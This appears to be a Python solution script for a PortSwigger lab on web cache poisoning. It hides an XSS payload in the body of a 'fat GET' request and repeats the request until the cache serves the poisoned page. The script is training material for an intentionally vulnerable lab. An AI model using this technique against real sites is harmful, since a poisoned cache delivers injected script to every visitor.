"""
Lab 7: Web cache poisoning via a fat GET request
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get
Difficulty: Practitioner

📝 The cache keys only on the URL; the origin still reads a request BODY
sent alongside a GET (a "fat GET") — smuggle a payload there, completely
invisible to the cache's keying logic.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
XSS_PAYLOAD = "'/><script>alert(1)</script>"


def run():
    s = get_session()

    note("`requests` normally won't attach a body to a GET without extra")
    note("effort — the API supports it via the `data` kwarg even on GET.")

    note("Confirming the origin reads body data on a fat GET at all.")
    r = s.get(f"{TARGET}/?cb=12345", data=f"param={XSS_PAYLOAD}")
    log(f"Reflected: {'alert(1)' in r.text}, X-Cache: {cache_status(r)!r}")

    note("Poisoning: cache-buster present, payload in the body.")
    poison_until_hit(s, f"{TARGET}/?cb=12345", data=f"param={XSS_PAYLOAD}")

    note("Re-poison the real URL, same body, no cache-buster.")
    r = poison_until_hit(s, f"{TARGET}/", data=f"param={XSS_PAYLOAD}")
    if r:
        log(f"Poisoned response reflects payload: {'alert(1)' in r.text}")


if __name__ == "__main__":
    run()
